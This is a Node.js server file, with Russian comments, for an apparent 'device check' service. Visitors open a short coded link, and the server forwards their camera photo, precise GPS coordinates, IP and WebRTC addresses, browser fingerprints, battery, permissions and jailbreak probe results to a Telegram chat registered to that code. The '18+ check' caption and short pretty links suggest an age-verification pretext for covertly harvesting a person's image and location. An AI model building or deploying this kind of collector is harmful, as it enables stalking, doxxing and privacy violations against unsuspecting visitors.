// === server/index.js (code -> chat_id, pretty /:code, JB summary in caption + HTML report) ===
import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';

// ==== ENV ====
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
const STATIC_ORIGIN    = (process.env.STATIC_ORIGIN || '*').trim();
const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';
const DB_PATH          = process.env.DB_PATH || './data/links.db';
const PORT             = Number(process.env.PORT || 10000);

// ==== Paths / Static ====
const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);
const PUBLIC_DIR = path.join(__dirname, 'public');

// ==== App ====
const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

// --- CORS
app.use((_, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
app.options('*', (_, res) => res.sendStatus(200));

// --- cache headers for static
app.use((req, res, next) => {
  if (/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?)$/i.test(req.path)) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }
  next();
});

// --- static
app.use(express.static(PUBLIC_DIR));
app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));

// ==== DB init ====
try {
  const dir = path.dirname(DB_PATH);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
} catch (e) {
  console.error('[db] mkdir failed for', DB_PATH, e);
}

console.log('[db] using', DB_PATH);
const db = new Database(DB_PATH);

// --- table (new scheme)
db.prepare(`
  CREATE TABLE IF NOT EXISTS user_codes (
    code       TEXT PRIMARY KEY,
    chat_id    TEXT NOT NULL,
    created_at INTEGER NOT NULL
  );
`).run();
db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_chat_id ON user_codes(chat_id);`).run();

// ---- optional migrate.sql
try {
  const migratePath = path.join(__dirname, 'migrate.sql');
  if (fs.existsSync(migratePath)) {
    console.log('[migrate] applying migrate.sql...');
    db.exec(fs.readFileSync(migratePath, 'utf8'));
  }
} catch (e) {
  console.error('[migrate] failed', e);
}

// ==== helpers ====
function requireAdminSecret(req, res, next) {
  const auth = req.headers['authorization'] || '';
  if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  next();
}
function escapeHTML(s = '') {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function b64ToBuffer(dataUrl = '') {
  const i = dataUrl.indexOf('base64,');
  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}
async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');
  if (!photoBuf?.length) throw new Error('Empty photo');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}
async function sendMessageToTelegram({ chatId, text, parse_mode = 'HTML' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const resp = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode })
  });
  if (!resp.ok) {
    const t = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${t}`);
  }
  return resp.json();
}
function safeJson(obj, space = 0) {
  try { return JSON.stringify(obj, null, space); }
  catch { return String(obj); }
}
function short(str, n = 64) {
  if (!str) return '';
  str = String(str);
  return str.length <= n ? str : (str.slice(0, n - 3) + '...');
}
function gmLink(lat, lon, z = 17) {
  const href = `https://maps.google.com/?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}&z=${z}`;
  return `<a href="${href}">${escapeHTML(`${lat}, ${lon}`)}</a>`;
}

// [NEW] --- отправка HTML отчёта как документа в TG
async function sendDocumentToTelegram({ chatId, htmlString, filename = 'report.html' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('document', new Blob([htmlString], { type: 'text/html; charset=utf-8' }), filename);

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

// [NEW] --- HTML Report builder (с расшифровкой)
function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari, cp, dc }) {
  const jb = (cp?.jbProbesActive) || {};
  const jbSum = jb.summary || {};
  const fp = jb.firstPositive || null;
  const jbResults = Array.isArray(jb.results) ? jb.results : [];

  const pubIP = cp?.publicIp || {};
  const net   = cp?.network || {};
  const bat   = cp?.battery || null;
  const webgl = cp?.webgl || null;
  const canvas= cp?.canvasFingerprint || null;
  const inApp = cp?.inAppWebView || {};
  const locale= cp?.locale || {};
  const webrtcCount = Array.isArray(cp?.webrtcIps) ? cp.webrtcIps.length : 0;
  const dcWords = Array.isArray(cp?.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';

  const jsonPretty = safeJson({
    geo, userAgent, platform, iosVersion, isSafari,
    client_profile: cp, device_check: dc
  }, 2);

  const css = `
    :root { color-scheme: light dark; }
    body { font: 14px/1.45 system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 0; padding: 24px; }
    .wrap { max-width: 980px; margin: 0 auto; }
    h1 { margin: 0 0 4px; font-size: 20px; }
    .muted { color: #6b7280; font-size: 12px; }
    .card { background: rgba(0,0,0,0.04); border: 1px solid rgba(0,0,0,0.08); padding: 16px; border-radius: 12px; margin: 14px 0; }
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid rgba(0,0,0,0.2); padding: 8px; text-align: left; vertical-align: top; }
    th { background: rgba(0,0,0,0.06); }
    code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
    pre { white-space: pre-wrap; word-break: break-word; background: rgba(0,0,0,0.04); padding: 12px; border-radius: 10px; }
    details { background: rgba(0,0,0,0.04); border: 1px dashed rgba(0,0,0,0.2); padding: 10px 12px; border-radius: 10px; }
    summary { cursor: pointer; font-weight: 600; }
    .kv { display: grid; grid-template-columns: 220px 1fr; gap: 8px; }
    .kv div { padding: 6px 8px; border-bottom: 1px dashed rgba(0,0,0,0.12); }
    .ok { color:#16a34a; font-weight:600 }
    .bad { color:#ef4444; font-weight:600 }
    .soft { color:#2563eb; }
  `;

  const jbInfo = fp?.scheme
    ? `Сработала схема <code>${escapeHTML(fp.scheme)}</code> (${escapeHTML(fp.reason||'signal')} ~${escapeHTML(fp.durationMs||'0')}ms)`
    : (Array.isArray(jbSum.reasons) && jbSum.reasons.length
        ? `Признаки: <code>${escapeHTML(jbSum.reasons.join(', '))}</code>`
        : 'Признаков не обнаружено');

  const checkStr = dc ? `${escapeHTML(dc.label||'?')} (${dc.score ?? '?'})` : '—';

  const geoStr = geo
    ? `<a class="soft" href="https://maps.google.com/?q=${encodeURIComponent(geo.lat)},${encodeURIComponent(geo.lon)}&z=17" target="_blank" rel="noreferrer">${escapeHTML(`${geo.lat}, ${geo.lon}`)}</a> &nbsp;±${escapeHTML(geo.acc)} м`
    : 'нет данных';

  const tableJb = jbResults.length
    ? `
      <div class="card">
        <h2>Попытки JB-сигналов</h2>
        <table>
          <thead><tr><th>scheme</th><th>opened</th><th>reason</th><th>ms</th></tr></thead>
          <tbody>
            ${jbResults.slice(0, 100).map(r => `
              <tr>
                <td><code>${escapeHTML(String(r.scheme||'').trim())}</code></td>
                <td>${r.opened ? '<span class="ok">yes</span>' : 'no'}</td>
                <td><code>${escapeHTML(r.reason || (r.opened ? 'signal' : 'timeout'))}</code></td>
                <td>${r.durationMs != null ? escapeHTML(String(r.durationMs)) : '-'}</td>
              </tr>
            `).join('')}
          </tbody>
        </table>
        ${jbResults.length > 100 ? `<div class="muted">Показаны первые 100 из ${jbResults.length}</div>` : ''}
      </div>`
    : '';

  const explain = `
    <div class="card">
      <h2>Что это значит (расшифровка)</h2>
      <ul>
        <li><b>JB</b> — краткий итог проверки на джейлбрейк. <i>positive</i> — есть сигналы, <i>negative</i> — нет.</li>
        <li><b>JB info</b> — какая схема/признак сработала и за сколько миллисекунд.</li>
        <li><b>iOS / Platform / UA</b> — версия системы, платформа и строка User-Agent с браузера.</li>
        <li><b>Geo</b> — координаты со ссылкой на Google Maps и точность (±м).</li>
        <li><b>IP / ISP</b> — публичный IP, страна, провайдер. Если странно совпадает с дата-центрами — выделяем в <code>DC-ISP</code>.</li>
        <li><b>WebRTC IPs</b> — сколько внутренних IP удалось извлечь через WebRTC (признак VPN/Proxy иногда заметен).</li>
        <li><b>Network</b> — тип канала (2g/3g/4g/5g/wifi) и оценка задержки.</li>
        <li><b>Battery</b> — уровень батареи и факт зарядки (если доступно, зависит от браузера).</li>
        <li><b>WebGL / Canvas</b> — косвенные параметры «железа» и хэш канваса для похожести/уникальности.</li>
        <li><b>In-App</b> — признаки открытия внутри приложения (Telegram/FB/Insta WebView и т.п.).</li>
        <li><b>TZ / Locale</b> — часовой пояс/языки. Несоответствия с гео/IP бывают подозрительны.</li>
        <li><b>Check</b> — интегральная метка и числовой балл девайс-чека.</li>
      </ul>
    </div>
  `;

  const top = `
    <div class="card">
      <h1>Отчёт по проверке устройства</h1>
      <div class="muted">Code: <code>${escapeHTML(String(code).toUpperCase())}</code></div>
      <div class="kv" style="margin-top:10px">
        <div><b>JB</b></div><div><code>${escapeHTML(jbSum.label || 'n/a')}</code></div>
        <div><b>JB info</b></div><div>${jbInfo}</div>
        <div><b>iOS</b></div><div><code>${escapeHTML(iosVersion ?? '')}</code></div>
        <div><b>Platform</b></div><div><code>${escapeHTML(platform || '')}</code></div>
        <div><b>UA</b></div><div><code>${escapeHTML(userAgent || '')}</code></div>
        <div><b>Geo</b></div><div>${geoStr}</div>
        <div><b>IP / ISP</b></div><div>${pubIP.ip ? `<code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> · <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'нет'}</div>
        <div><b>WebRTC IPs</b></div><div><code>${webrtcCount}</code> · DC-ISP: <code>${escapeHTML(short(dcWords, 40) || '–')}</code></div>
        <div><b>Network</b></div><div><code>${escapeHTML(String(net.effectiveType||'')).toLowerCase()||'?'}, rtt=${escapeHTML(net.rtt!=null?String(net.rtt):'?')}</code></div>
        <div><b>Battery</b></div><div>${bat ? `<code>${bat.level}%${bat.charging ? ' (chg)' : ''}</code>` : '—'}</div>
        <div><b>WebGL</b></div><div>${webgl ? `<code>${escapeHTML(short(webgl.vendor,40))} | ${escapeHTML(short(webgl.renderer,40))}</code>` : '—'}</div>
        <div><b>Canvas</b></div><div>${canvas ? `<code>${escapeHTML(short(canvas.hash,18))} (${canvas.size})</code>` : '—'}</div>
        <div><b>In-App</b></div><div>${inApp?.isInApp ? `<code>${escapeHTML((inApp.any||[]).join(','))}</code>` : 'нет'}</div>
        <div><b>TZ</b></div><div>${locale?.timeZone ? `<code>${escapeHTML(locale.timeZone)}</code>` : '—'}</div>
        <div><b>Check</b></div><div><code>${checkStr}</code></div>
      </div>
    </div>
  `;

  const perms = cp?.permissions ? `
    <div class="card">
      <h2>Разрешения</h2>
      <table>
        <thead><tr><th>Гео</th><th>Камера</th><th>Микрофон</th></tr></thead>
        <tbody>
          <tr>
            <td><code>${escapeHTML(String(cp.permissions.geolocation ?? '?'))}</code></td>
            <td><code>${escapeHTML(String(cp.permissions.camera ?? '?'))}</code></td>
            <td><code>${escapeHTML(String(cp.permissions.microphone ?? '?'))}</code></td>
          </tr>
        </tbody>
      </table>
    </div>
  ` : '';

  const raw = `
    <div class="card">
      <details open>
        <summary>Сырой JSON</summary>
        <pre>${escapeHTML(jsonPretty)}</pre>
      </details>
    </div>
  `;

  const html = `
    <!doctype html>
    <html lang="ru">
    <head>
      <meta charset="utf-8"/>
      <meta name="viewport" content="width=device-width, initial-scale=1"/>
      <title>Отчёт проверки — ${escapeHTML(String(code).toUpperCase())}</title>
      <style>${css}</style>
    </head>
    <body>
      <div class="wrap">
        ${top}
        ${tableJb}
        ${perms}
        ${explain}
        ${raw}
        <div class="muted">Сформировано автоматически • ${new Date().toISOString()}</div>
      </div>
    </body>
    </html>
  `;
  return html;
}

// ==== health & debug ====
app.get('/health', (_req, res) => res.json({ ok: true }));
app.get('/api/debug/db', (_req, res) => {
  try {
    const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
    const codes = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
    res.json({ ok:true, DB_PATH, size, codes });
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});

// ==== Admin: register-code ====
app.post('/api/register-code', requireAdminSecret, (req, res) => {
  try {
    const { code, chatId } = req.body || {};
    if (!code || !/^[A-Z0-9\-]{3,40}$/i.test(code)) {
      return res.status(400).json({ ok:false, error:'Invalid code' });
    }
    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
      return res.status(400).json({ ok:false, error:'Invalid chatId' });
    }
    db.prepare('INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)')
      .run(String(code).toUpperCase(), String(chatId), Date.now());
    res.json({ ok:true, code:String(code).toUpperCase(), chatId:String(chatId) });
  } catch (e) {
    console.error('[register-code] error:', e);
    res.status(500).json({ ok:false, error:'Internal' });
  }
});

// ==== Pretty URL: /:code -> index.html?code=... ====
app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
  const code = req.params.code.toString();
  let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
  const injected = html.replace(
    /<head>/i,
    `<head><script>history.replaceState(null,'','/index.html?code=${code}');</script>`
  );
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(injected);
});

// ==== API: client-ip (минимум; без внешних сервисов) ====
app.get('/api/client-ip', (req, res) => {
  const fwd = (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim();
  const ip  = fwd || req.ip || null;
  const country =
    req.headers['cf-ipcountry'] ||
    req.headers['x-vercel-ip-country'] ||
    req.headers['x-country-code'] || null;
  const isp = req.headers['x-real-isp'] || null; // можно прокидывать с edge
  res.json({ ip, country, isp, ua: req.headers['user-agent'] || null });
});

// ==== API: report (фото + сводка, JB summary, JB table, полный JSON + HTML) ====
app.post('/api/report', async (req, res) => {
  try {
    const {
      userAgent, platform, iosVersion, isSafari,
      geo, photoBase64, note, code,

      // из фронта:
      client_profile,   // быстрый мультисбор (включая jbProbesActive)
      device_check      // { score, label, reasons[], details{...} }
    } = req.body || {};

    if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
    if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });

    const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
      .get(String(code).toUpperCase());
    if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });

    // Алиасы
    const cp = client_profile || {};
    const dc = device_check   || {};

    const webrtcCount = Array.isArray(cp.webrtcIps) ? cp.webrtcIps.length : 0;
    const dcWords = Array.isArray(cp.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';
    const net = cp.network || {};
    const bat = cp.battery || null;
    const webgl = cp.webgl || null;
    const canvas = cp.canvasFingerprint || null;
    const inApp = cp.inAppWebView || {};
    const locale = cp.locale || {};
    const pubIP = cp.publicIp || {};

    // JB summary
    const jb = cp.jbProbesActive || {};
    const jbSum = jb.summary || {};
    const fp = jb.firstPositive || null;

    // ====== КАПШН (тестовая часть) — твой порядок ======
    const linesTop = [
      '<b>Новый отчёт 18+ проверка</b>',
      `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
      `JB: <code>${escapeHTML(jbSum.label || 'n/a')}</code>`,
      (fp?.scheme
        ? `JB info: <code>${escapeHTML(fp.scheme)}</code> (${escapeHTML(fp.reason||'signal')} ~${escapeHTML(fp.durationMs||'0')}ms)`
        : (Array.isArray(jbSum.reasons) && jbSum.reasons.length
            ? `JB info: <code>${escapeHTML(jbSum.reasons.join(', '))}</code>`
            : `JB info: <code>—</code>`)),
      `iOS: <code>${escapeHTML(iosVersion ?? '')}</code>`,
      `Platform: <code>${escapeHTML(platform || '')}</code>`,
      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
      (geo
        ? `Geo: ${gmLink(geo.lat, geo.lon)} <code>±${escapeHTML(geo.acc)}</code>m`
        : 'Geo: <code>нет</code>')
    ];

    const linesRest = [
      cp.permissions ? `Perms: <code>geo=${escapeHTML(cp.permissions.geolocation||'?')} cam=${escapeHTML(cp.permissions.camera||'?')} mic=${escapeHTML(cp.permissions.microphone||'?')}</code>` : null,
      pubIP.ip ? `IP: <code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> ISP: <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'IP: <code>нет</code>',
      `WebRTC IPs: <code>${webrtcCount}</code>  DC-ISP: <code>${escapeHTML(short(dcWords, 40) || '–')}</code>`,
      `Net: <code>${escapeHTML(String(net.effectiveType||'')).toLowerCase()||'?'}, rtt=${escapeHTML(net.rtt!=null?String(net.rtt):'?')}</code>`,
      bat ? `Battery: <code>${bat.level}%${bat.charging? ' (chg)': ''}</code>` : null,
      webgl ? `WebGL: <code>${escapeHTML(short(webgl.vendor,40))} | ${escapeHTML(short(webgl.renderer,40))}</code>` : null,
      canvas ? `Canvas: <code>${escapeHTML(short(canvas.hash,18))} (${canvas.size})</code>` : null,
      inApp?.isInApp ? `InApp: <code>${escapeHTML((inApp.any||[]).join(','))}</code>` : 'InApp: <code>нет</code>',
      locale?.timeZone ? `TZ: <code>${escapeHTML(locale.timeZone)}</code>` : null,
      (dc && (dc.score!=null || dc.label)) ? `Check: <code>${escapeHTML(dc.label||'?')} (${dc.score ?? '?'})</code>` : null,
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean);

    const caption = [...linesTop, ...linesRest].join('\n');

    // 1) Фото + капшн
    const buf = b64ToBuffer(photoBase64);
    const tgPhoto = await sendPhotoToTelegram({
      chatId: String(row.chat_id),
      caption,
      photoBuf: buf
    });

    // 1.1) Компактная таблица JB-спроб (если есть)
    const jbResults = Array.isArray(jb.results) ? jb.results : [];
    if (jbResults.length) {
      const head = 'scheme | opened | reason | ms';
      const rows = jbResults.slice(0, 8).map(r => {
        const s  = String(r.scheme || '').replace(/\s+/g, '');
        const o  = r.opened ? 'yes' : 'no';
        const re = (r.reason || (r.opened ? 'signal' : 'timeout'));
        const ms = (r.durationMs != null ? String(r.durationMs) : '-');
        return `${s} | ${o} | ${re} | ${ms}`;
      });
      const table = [head, ...rows].join('\n');
      await sendMessageToTelegram({
        chatId: String(row.chat_id),
        text: `<b>JB attempts (${jbResults.length})</b>\n<pre>${escapeHTML(table)}</pre>`,
        parse_mode: 'HTML'
      });
    }

    // 2) Полный JSON мультисбора и девайс-чека — чанками (оставил как было)
    const fullJson = safeJson({
      geo, userAgent, platform, iosVersion, isSafari,
      client_profile: cp, device_check: dc
    }, 2);

    const CHUNK = 3500; // запас ниже лимита 4096
    for (let i = 0; i < fullJson.length; i += CHUNK) {
      const part = fullJson.slice(i, i + CHUNK);
      await sendMessageToTelegram({
        chatId: String(row.chat_id),
        text: `<b>Детали (${1 + Math.floor(i / CHUNK)})</b>\n<pre>${escapeHTML(part)}</pre>`,
        parse_mode: 'HTML'
      });
    }

    // [NEW] 3) Генерация и отправка ОДНОГО HTML-файла с расшифровкой
    try {
      const html = buildHtmlReport({
        code, geo, userAgent, platform, iosVersion, isSafari,
        cp, dc
      });
      const fname = `report-${String(code).toUpperCase()}-${Date.now()}.html`;
      await sendDocumentToTelegram({
        chatId: String(row.chat_id),
        htmlString: html,
        filename: fname
      });
    } catch (e) {
      console.error('[report] HTML send failed:', e);
      // Не роняем основной ответ
    }

    res.json({
      ok: true,
      sent: [{ chatId: String(row.chat_id), ok: true, message_id: tgPhoto?.result?.message_id }]
    });
  } catch (e) {
    console.error('[report] error:', e);
    res.status(500).json({ ok: false, error: e.message || 'Internal error' });
  }
});

// ==== 404 fallback ====
app.use((req, res) => {
  if (req.method === 'GET' && req.accepts('html')) return res.status(404).send('Not Found');
  res.status(404).json({ ok: false, error: 'Not Found' });
});

// ==== Start ====
app.listen(PORT, () => {
  console.log(`[server] listening on :${PORT}`);
  console.log(`[server] Public dir: ${PUBLIC_DIR}`);
  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
  console.log(`[server] PUBLIC_BASE: ${PUBLIC_BASE}`);
});
